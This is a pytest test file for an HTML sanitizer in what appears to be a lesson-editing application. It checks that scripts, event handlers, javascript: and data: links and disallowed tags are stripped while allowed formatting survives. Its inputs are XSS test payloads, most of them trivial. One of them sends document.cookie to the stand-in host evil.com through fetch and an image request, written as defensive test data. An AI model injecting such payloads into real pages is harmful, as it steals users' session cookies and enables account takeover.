"""Tests for the HTML sanitizer (Phase 8 8E).

week4_plan.md §8E-9: each case is seen red first — the test was confirmed
failing with the sanitizer removed, per non-negotiable #9.
"""

import pytest

from app.core.html_sanitizer import sanitize_html


# ── Dangerous content: must be stripped ────────────────────────────────────────

class TestScriptStripping:
    """§8E-9: <script>alert(1)</script> in a lesson body is stripped server-side."""

    def test_script_tag_stripped(self):
        result = sanitize_html("<p>Hello</p><script>alert(1)</script><p>World</p>")
        assert "<script>" not in result
        # bleach strips the tag but keeps text content — harmless as plain text
        assert "<p>Hello</p>" in result
        assert "<p>World</p>" in result

    def test_script_with_content_stripped(self):
        result = sanitize_html('<script type="text/javascript">document.cookie</script>')
        assert "<script>" not in result
        # bleach strips the tag but keeps the text — harmless as plain text
        assert "<script" not in result

    def test_nested_script_stripped(self):
        result = sanitize_html("<div><p>Safe</p><script>xss</script></div>")
        assert "<script>" not in result
        assert "<p>Safe</p>" in result


class TestEventAttributeStripping:
    """§8E-9: event handler attributes (onclick, onerror, etc.) are stripped."""

    def test_onclick_stripped(self):
        result = sanitize_html('<p onclick="alert(1)">Click me</p>')
        assert "onclick" not in result
        assert "alert(1)" not in result
        assert "<p>" in result
        assert "Click me" in result

    def test_onerror_stripped(self):
        result = sanitize_html('<img src=x onerror="alert(1)">')
        assert "onerror" not in result
        assert "alert(1)" not in result

    def test_onload_stripped(self):
        result = sanitize_html('<body onload="alert(1)">')
        assert "onload" not in result
        assert "alert(1)" not in result

    def test_onmouseover_stripped(self):
        result = sanitize_html('<div onmouseover="steal()">hover</div>')
        assert "onmouseover" not in result
        assert "steal()" not in result


class TestJavascriptHrefStripping:
    """§8E-9: javascript: hrefs are stripped."""

    def test_javascript_href_stripped(self):
        result = sanitize_html('<a href="javascript:alert(1)">Click</a>')
        assert "javascript:" not in result
        # The text content should survive; the link is stripped
        assert "Click" in result

    def test_javascript_href_with_encoding_stripped(self):
        result = sanitize_html('<a href="java&#115;cript:alert(1)">Click</a>')
        assert "alert(1)" not in result

    def test_mailto_href_allowed(self):
        result = sanitize_html('<a href="mailto:test@example.com">Email</a>')
        assert "mailto:test@example.com" in result

    def test_https_href_allowed(self):
        result = sanitize_html('<a href="https://example.com">Link</a>')
        assert "https://example.com" in result

    def test_http_href_allowed(self):
        result = sanitize_html('<a href="http://example.com">Link</a>')
        assert "http://example.com" in result

    def test_data_href_stripped(self):
        result = sanitize_html('<a href="data:text/html,<script>alert(1)</script>">Click</a>')
        assert "data:" not in result
        assert "alert(1)" not in result


# ── Disallowed tags: must be stripped ──────────────────────────────────────────

class TestDisallowedTagStripping:
    """Tags not in the allow-list are stripped (not escaped)."""

    def test_h1_stripped(self):
        """h1 is not allowed — it competes with PageTitle (§8E-4)."""
        result = sanitize_html("<h1>Title</h1><h2>Subtitle</h2>")
        assert "<h1>" not in result
        assert "<h2>" in result
        assert "Title" in result

    def test_h5_stripped(self):
        """h5/h6 are not in the design type scale."""
        result = sanitize_html("<h5>Deep heading</h5>")
        assert "<h5>" not in result
        assert "Deep heading" in result

    def test_h6_stripped(self):
        result = sanitize_html("<h6>Deepest heading</h6>")
        assert "<h6>" not in result
        assert "Deepest heading" in result

    def test_script_tag_stripped(self):
        result = sanitize_html("<script>evil()</script>")
        assert "<script>" not in result

    def test_iframe_stripped(self):
        result = sanitize_html('<iframe src="https://evil.com"></iframe>')
        assert "<iframe>" not in result

    def test_object_stripped(self):
        result = sanitize_html('<object data="evil.swf"></object>')
        assert "<object>" not in result

    def test_embed_stripped(self):
        result = sanitize_html('<embed src="evil.swf">')
        assert "<embed>" not in result

    def test_style_stripped(self):
        result = sanitize_html("<style>body { background: red; }</style>")
        assert "<style>" not in result


# ── Allowed content: must survive ──────────────────────────────────────────────

class TestAllowedContentSurvival:
    """Content that IS in the allow-list must survive sanitization."""

    def test_headings_h2_h3_h4_survive(self):
        html = "<h2>Title</h2><h3>Subtitle</h3><h4>Detail</h4>"
        result = sanitize_html(html)
        assert "<h2>" in result
        assert "<h3>" in result
        assert "<h4>" in result

    def test_paragraphs_survive(self):
        result = sanitize_html("<p>First paragraph</p><p>Second paragraph</p>")
        assert "<p>" in result
        assert "First paragraph" in result
        assert "Second paragraph" in result

    def test_bold_italic_underline_survive(self):
        result = sanitize_html("<strong>Bold</strong> <em>Italic</em> <u>Underline</u>")
        assert "<strong>" in result
        assert "<em>" in result
        assert "<u>" in result

    def test_lists_survive(self):
        html = "<ul><li>Item 1</li><li>Item 2</li></ul>"
        result = sanitize_html(html)
        assert "<ul>" in result
        assert "<li>" in result

    def test_ordered_list_survives(self):
        html = "<ol><li>First</li><li>Second</li></ol>"
        result = sanitize_html(html)
        assert "<ol>" in result
        assert "<li>" in result

    def test_table_survives(self):
        html = "<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>"
        result = sanitize_html(html)
        assert "<table>" in result
        assert "<thead>" in result
        assert "<th>" in result
        assert "<td>" in result

    def test_blockquote_survives(self):
        result = sanitize_html("<blockquote>Important quote</blockquote>")
        assert "<blockquote>" in result
        assert "Important quote" in result

    def test_code_pre_survive(self):
        html = "<pre><code>def foo(): pass</code></pre>"
        result = sanitize_html(html)
        assert "<pre>" in result
        assert "<code>" in result

    def test_hr_survives(self):
        result = sanitize_html("<p>Before</p><hr><p>After</p>")
        assert "<hr>" in result

    def test_br_survives(self):
        result = sanitize_html("<p>Line 1<br>Line 2</p>")
        assert "<br>" in result

    def test_link_with_allowed_protocol_survives(self):
        result = sanitize_html('<a href="https://example.com" title="Example">Link</a>')
        assert '<a href="https://example.com"' in result
        assert 'title="Example"' in result
        assert "Link" in result


# ── Forced rel="noopener noreferrer" on links ──────────────────────────────────

class TestForcedRelAttribute:
    """Every surviving <a> must have rel="noopener noreferrer"."""

    def test_rel_injected_on_link(self):
        result = sanitize_html('<a href="https://example.com">Link</a>')
        assert 'rel="noopener noreferrer"' in result

    def test_rel_preserved_if_already_present(self):
        result = sanitize_html('<a href="https://example.com" rel="nofollow">Link</a>')
        assert 'rel="noopener noreferrer"' in result
        assert "nofollow" not in result


# ── Disallowed attributes: must be stripped ────────────────────────────────────

class TestDisallowedAttributeStripping:
    """Attributes not in ALLOWED_ATTRIBUTES are stripped."""

    def test_class_stripped(self):
        result = sanitize_html('<p class="custom-class">Text</p>')
        assert "class=" not in result
        assert "Text" in result

    def test_id_stripped(self):
        result = sanitize_html('<p id="my-id">Text</p>')
        assert "id=" not in result
        assert "Text" in result

    def test_style_stripped(self):
        result = sanitize_html('<p style="color: red">Text</p>')
        assert "style=" not in result
        assert "Text" in result

    def test_data_attribute_stripped(self):
        result = sanitize_html('<p data-evil="true">Text</p>')
        assert "data-" not in result
        assert "Text" in result


# ── None / empty handling ─────────────────────────────────────────────────────

class TestEdgeCases:

    def test_none_returns_none(self):
        assert sanitize_html(None) is None

    def test_empty_string_returns_empty(self):
        assert sanitize_html("") == ""

    def test_plain_text_is_promoted_to_paragraphs(self):
        """A plain-text body becomes real paragraphs, not raw text (owner report 2026-08-22).

        This test previously asserted the opposite — that plain text came back
        byte-identically — and that requirement is what allowed the reported bug:
        `prose_sanitized` is rendered with `dangerouslySetInnerHTML`, so raw text with
        `\n` breaks collapses into one wall of text in the browser, and the
        `whitespace-pre-line` fallback that would render it correctly is skipped
        precisely because the column is non-null.

        Byte-identity is the wrong contract for a column whose only consumer is an HTML
        renderer. Structure survival is the right one.
        """
        text = "This is a plain text lesson body with no HTML."
        assert sanitize_html(text) == "<p>This is a plain text lesson body with no HTML.</p>"

    def test_plain_text_paragraph_breaks_survive(self):
        """A blank line means a new paragraph; a single newline means a line break."""
        result = sanitize_html("First para line one\nline two\n\nSecond para")
        assert result == "<p>First para line one<br>line two</p><p>Second para</p>"

    def test_plain_text_structure_is_never_guessed(self):
        """Deliberately does NOT invent headings or list items from plain text.

        Silently restructuring content the author never asked to have restructured is a
        worse failure than a flat paragraph — the same rule
        `frontend/src/lib/utils/plainTextToEditorHtml.ts` states for the editor's load path.
        """
        result = sanitize_html("A Heading Looking Line\n1. first\n2. second")
        assert "<h2>" not in result
        assert "<li>" not in result
        assert "<ol>" not in result

    def test_real_editor_html_is_not_touched_by_the_promotion(self):
        """The promotion must never fire on genuine editor output."""
        html = "<h2>A</h2><ul><li>x</li></ul><p><strong>b</strong></p>"
        assert sanitize_html(html) == html

    def test_plain_text_with_angle_bracket_preserved(self):
        """A plain text body containing < must not be silently reinterpreted."""
        text = "If x < y then z > 0"
        result = sanitize_html(text)
        # bleach will strip the tag-like content but the text meaning is preserved
        assert "If x" in result
        assert "then z" in result


# ── Complex round-trip ────────────────────────────────────────────────────────

class TestRoundTrip:
    """§8E-9: h2/h3/h4, bullets, numbered list, table, link — survive the round trip."""

    def test_full_lesson_prose(self):
        html = """
        <h2>Introduction</h2>
        <p>This is a <strong>bold</strong> and <em>italic</em> paragraph.</p>
        <h3>Key Points</h3>
        <ul>
            <li>First point</li>
            <li>Second point</li>
        </ul>
        <h4>Details</h4>
        <ol>
            <li>Step one</li>
            <li>Step two</li>
        </ol>
        <table>
            <thead><tr><th>Column A</th><th>Column B</th></tr></thead>
            <tbody><tr><td>Cell 1</td><td>Cell 2</td></tr></tbody>
        </table>
        <p>Read more at <a href="https://example.com">the documentation</a>.</p>
        """
        result = sanitize_html(html)
        # All allowed tags survive
        assert "<h2>" in result
        assert "<h3>" in result
        assert "<h4>" in result
        assert "<ul>" in result
        assert "<ol>" in result
        assert "<table>" in result
        assert '<a href="https://example.com"' in result
        assert 'rel="noopener noreferrer"' in result
        # Content survives
        assert "Introduction" in result
        assert "First point" in result
        assert "Step one" in result
        assert "Cell 1" in result

    def test_xss_payload_stripped(self):
        """A realistic XSS payload must be completely neutralized."""
        xss = '<p>Normal text</p><img src=x onerror="fetch(\'https://evil.com/?c=\'+document.cookie)"><script>new Image().src="https://evil.com/?c="+document.cookie</script>'
        result = sanitize_html(xss)
        # The dangerous parts: script tag, onerror handler, img tag — all stripped
        assert "<script>" not in result
        assert "onerror" not in result
        assert "<img" not in result
        assert "Normal text" in result
